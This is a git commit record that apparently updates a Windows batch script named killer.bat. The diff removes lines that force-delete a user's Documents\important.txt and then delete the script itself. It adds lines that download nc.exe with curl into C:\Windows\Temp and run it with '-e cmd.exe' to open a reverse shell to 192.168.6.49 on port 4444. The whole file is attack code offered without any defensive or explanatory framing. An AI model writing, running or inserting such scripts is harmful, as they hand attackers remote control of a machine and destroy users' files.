9362c8892f15bc842b9f95a346cb3b75858edb39
bhartendragit <bhartendra2507@gmail.com>
2024-12-09 14:59:37 +0530

    Update killer.bat

--- killer.bat
+++ killer.bat
@@ -1,3 +1,14 @@
-cmd /c del /f "%USERPROFILE%\Documents\important.txt"
-timeout /t 1 > nul
-del /f "%~f0"
+@echo off
+REM Download nc.exe from GitHub
+curl -s https://raw.githubusercontent.com/bhartendragit/code/main/nc.exe -o C:\Windows\Temp\nc.exe
+
+REM Check if nc.exe was downloaded successfully
+if exist C:\Windows\Temp\nc.exe (
+    echo nc.exe downloaded successfully.
+) else (
+    echo Failed to download nc.exe.
+    exit /b
+)
+
+REM Execute netcat for reverse shell
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.6.49 4444
